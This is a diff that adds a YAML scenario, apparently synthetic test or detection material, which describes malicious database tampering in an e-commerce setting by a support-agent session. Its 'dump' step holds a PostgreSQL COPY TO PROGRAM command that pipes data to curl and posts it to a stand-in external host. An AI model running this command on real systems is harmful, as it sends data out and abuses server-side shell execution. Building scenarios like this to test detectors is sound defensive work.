@@ -1,0 +1,23 @@
+scenario_id: gen_ecommerce_15_data_tamper_mal_372
+family_id: gen_ecommerce_15_data_tamper_mal_fam372
+domain: ecommerce
+time_of_day: 02:20
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: tamper
+  role: support_agent
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 1.0
+  events:
+  - step_id: act
+    sql: INSERT INTO payments DEFAULT VALUES
+  - step_id: dump
+    sql: COPY (SELECT 1) TO PROGRAM 'curl -sX POST https://clearinghouse-batch.example/ingest
+      -d @-'
+    connects_to:
+      ip: 45.77.145.200
+      port: 9443
